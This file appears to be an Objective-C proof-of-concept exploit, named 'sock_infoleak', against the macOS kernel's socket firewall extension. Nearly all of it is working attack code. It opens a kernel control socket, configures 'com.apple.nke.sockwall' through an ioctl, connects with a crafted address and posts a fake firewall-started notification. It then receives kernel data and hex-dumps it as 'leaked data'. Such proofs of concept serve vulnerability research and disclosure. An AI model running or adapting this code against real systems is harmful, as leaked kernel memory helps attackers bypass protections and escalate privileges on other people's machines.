//
//  main.m
//  sock_infoleak
//
//  Created by maldiohead on 2018/12/23.
//  Copyright © 2018 maldiohead. All rights reserved.
//

#import  <Foundation/Foundation.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CoreFoundation/CFSocket.h>
#include <CoreFoundation/CFData.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#import  <dispatch/dispatch.h>
#import  <Foundation/Foundation.h>
#include <stdio.h>
#include <notify.h>
#include <SystemConfiguration/SystemConfiguration.h>

int            so;
CFSocketRef sockref;

void  socket_callback(CFSocketRef s, CFSocketCallBackType type, CFDataRef address, const void *data, void *info)
{
    return;
}

static Boolean initialize_store(void)
{
    SCDynamicStoreRef   store = SCDynamicStoreCreate(NULL,
                                                     CFSTR("Kernel Event Monitor plug-in"),
                                                     NULL,
                                                     NULL);
    if (store == NULL) {
        NSLog(@"[!]SCDynamicStoreCreate() failed: %s", SCErrorString(SCError()));
        return (FALSE);
    }
    return (TRUE);
}

void func()
{
    
    CFStringCreateWithFormat(0LL, 0LL, CFSTR("<kernel event socket>"));
    
}

void callback(CFNotificationCenterRef center, void *observer, CFNotificationName name, const void *object, CFDictionaryRef userInfo)
{
    return;
}

void SocketCallBack(CFSocketRef s, CFSocketCallBackType type, CFDataRef address, const void *data, void *info)
{
    
    CFSocketNativeHandle handle= CFSocketGetNative(sockref);
    uint8_t buf[0x830]={0};
    int retsize= recv(handle, &buf, 0x830uLL, 0);
    if(retsize==0)
        return;
    printf("[#]got!,leaked data:");
    for(int i=0;i<retsize;i++)
    {
        if(i%0x10==0)
            printf("\n");
        printf("%0.2x ",buf[i]);
        
    }
    printf("\n");
    return;
    
    
}

int main(int argc, const char * argv[]) {

    int            status;
    
    if (!initialize_store())
    {
        printf("[!]kernel event monitor disabled");
        return 0;
    }
    so = socket(32, SOCK_DGRAM, 2);
    int ret;
    uint8_t wallstruct[0x60]={0};
    strcpy(&wallstruct[4], "com.apple.nke.sockwall");
    *(uint64_t*)&wallstruct[39]=0;
    *(uint64_t*)&wallstruct[45]=1;
    *(uint64_t*)&wallstruct[53]=0;
    *(uint64_t*)&wallstruct[61]=0;
  
    
    if((so!=-1))
    {
        status = ioctl(so, 0xC0644E03, wallstruct);
        
    }
    else {
        printf("[!]could not open event socket, socket() failed: %s", strerror(errno));
        return 0;
    }
    
    if(status==0)
    {
        struct sockaddr sa;
        uint8_t* saptr=&sa;
        sa.sa_len=0x20;
        saptr[1]=0x20;
        saptr[2]=2;
        saptr[3]=0;
        *(uint32_t*)&saptr[4]=2;
        *(uint32_t*)&saptr[8]=0;
        *(uint64_t*)&saptr[0xc]=0;
        *(uint64_t*)&saptr[0x14]=0;
        *(uint32_t*)&saptr[0x1c]=0;
       
       if( ret=connect(so,saptr, 0x20))
       {
           int err=errno;
           if(err==1)
           printf("[!] something may be wrong or run as root!\n");
           else
               printf("[!]failed to run!\n");
           return 0;
       }
        
    }
    
    CFSocketContext dd;
    sockref  = CFSocketCreateWithNative(0,so,1,SocketCallBack,&dd);
    CFRunLoopSourceRef  loopsrcref=  CFSocketCreateRunLoopSource(0LL, sockref, 0LL);
    CFRunLoopRef loopref=  CFRunLoopGetCurrent();
    CFRunLoopAddSource(loopref, loopsrcref, kCFRunLoopDefaultMode);
    CFNotificationCenterRef ref=CFNotificationCenterGetDistributedCenter();
    CFNotificationCenterAddObserver(ref, 0LL, callback, CFSTR("com.apple.alf"), 0LL, 4LL);
    CFNotificationCenterRef ncr=   CFNotificationCenterGetDistributedCenter();
    CFNotificationCenterPostNotificationWithOptions(ncr, CFSTR("com.apple.alf"), CFSTR("FirewallDaemonstarted"),0LL,3LL);
    CFRunLoopRun();
    return 0;
}
